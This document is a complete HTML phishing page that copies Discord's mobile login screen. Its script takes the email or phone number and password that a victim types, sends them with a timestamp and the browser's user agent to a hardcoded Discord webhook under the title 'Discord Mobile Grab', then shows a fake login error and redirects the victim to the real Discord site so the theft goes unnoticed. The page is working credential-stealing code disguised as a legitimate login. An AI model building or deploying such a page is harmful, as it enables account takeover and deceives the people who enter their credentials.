<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Discord - Login</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/3/35/Discord-Logo-White.svg" type="image/svg+xml">
  <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'gg sans', sans-serif;
      background: #36393f;
      color: #dcddde;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    .status-bar {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 44px;
      background: rgba(0,0,0,0.3);
      color: white;
      font-size: 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0 16px;
      z-index: 10;
      backdrop-filter: blur(10px);
    }
    .status-bar .time { font-weight: 600; }
    .status-bar .icons { display: flex; gap: 6px; }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 40px 24px 60px;
      max-width: 500px;
      margin: 0 auto;
      width: 100%;
    }
    .logo-container {
      text-align: center;
      margin-bottom: 32px;
      position: relative;
    }
    .logo {
      width: 80px;
      height: auto;
    }
    .help-btn {
      position: absolute;
      top: 0;
      right: 0;
      background: #5865f2;
      color: white;
      border: none;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      font-size: 14px;
      cursor: pointer;
    }
    h1 {
      font-size: 28px;
      font-weight: 600;
      color: #fff;
      text-align: center;
      margin-bottom: 8px;
    }
    .subtitle {
      font-size: 16px;
      color: #b9bbbe;
      text-align: center;
      margin-bottom: 40px;
    }
    .form-group {
      margin-bottom: 24px;
      text-align: left;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      color: #b9bbbe;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      background: #202225;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 16px;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 0 2px #00aff4;
    }
    .forgot {
      font-size: 14px;
      color: #00aff4;
      text-decoration: none;
      display: block;
      margin: 8px 0 32px;
    }
    .forgot:hover {
      text-decoration: underline;
    }
    .btn {
      width: 100%;
      padding: 14px;
      background: #5865f2;
      border: none;
      border-radius: 4px;
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
    .btn:hover {
      background: #4752c4;
    }
    .footer {
      text-align: center;
      font-size: 14px;
      color: #72767d;
      margin-top: 40px;
    }
    .footer a {
      color: #00aff4;
      text-decoration: none;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    .error {
      color: #ed4245;
      font-size: 14px;
      text-align: center;
      margin: 16px 0;
      display: none;
    }
    @media (min-width: 768px) {
      .container { padding: 60px 40px; max-width: 440px; }
    }
  </style>
</head>
<body>
  <div class="status-bar">
    <div class="time">02:30</div>
    <div class="icons">📶 WiFi 🔋</div>
  </div>

  <div class="container">
    <div class="logo-container">
      <img src="https://upload.wikimedia.org/wikipedia/commons/3/35/Discord-Logo-White.svg" alt="Discord" class="logo">
      <button class="help-btn">?</button>
    </div>

    <h1>Welcome back!</h1>
    <p class="subtitle">We're so excited to see you again!</p>

    <form id="loginForm">
      <div class="form-group">
        <label>EMAIL OR PHONE NUMBER *</label>
        <input type="text" id="email" required autocomplete="off"/>
      </div>

      <div class="form-group">
        <label>PASSWORD *</label>
        <input type="password" id="password" required autocomplete="off"/>
      </div>

      <a href="#" class="forgot">Forgot your password?</a>

      <div class="error" id="errorMsg"></div>

      <button type="submit" class="btn">Log In</button>
    </form>

    <div class="footer">
      Need an account? <a href="https://discord.com/register">Register</a>
    </div>
  </div>

  <script>
    const webhook = "https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp";

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const error = document.getElementById("errorMsg");

      if (!email || !password) {
        error.textContent = "Please fill in all fields.";
        error.style.display = "block";
        return;
      }

      error.style.display = "none";

      try {
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [{
              title: "🎯 Discord Mobile Grab",
              color: 0x5865F2,
              fields: [
                { name: "Email/Phone", value: `\`\`\`${email}\`\`\``, inline: false },
                { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
                { name: "Time", value: new Date().toISOString(), inline: true },
                { name: "UA", value: navigator.userAgent, inline: false }
              ]
            }]
          })
        });
      } catch {}

      error.textContent = "Login failed. Please check your credentials and try again.";
      error.style.display = "block";

      setTimeout(() => {
        window.location.href = "https://discord.com/login";
      }, 2000);
    });
  </script>
</body>
</html>
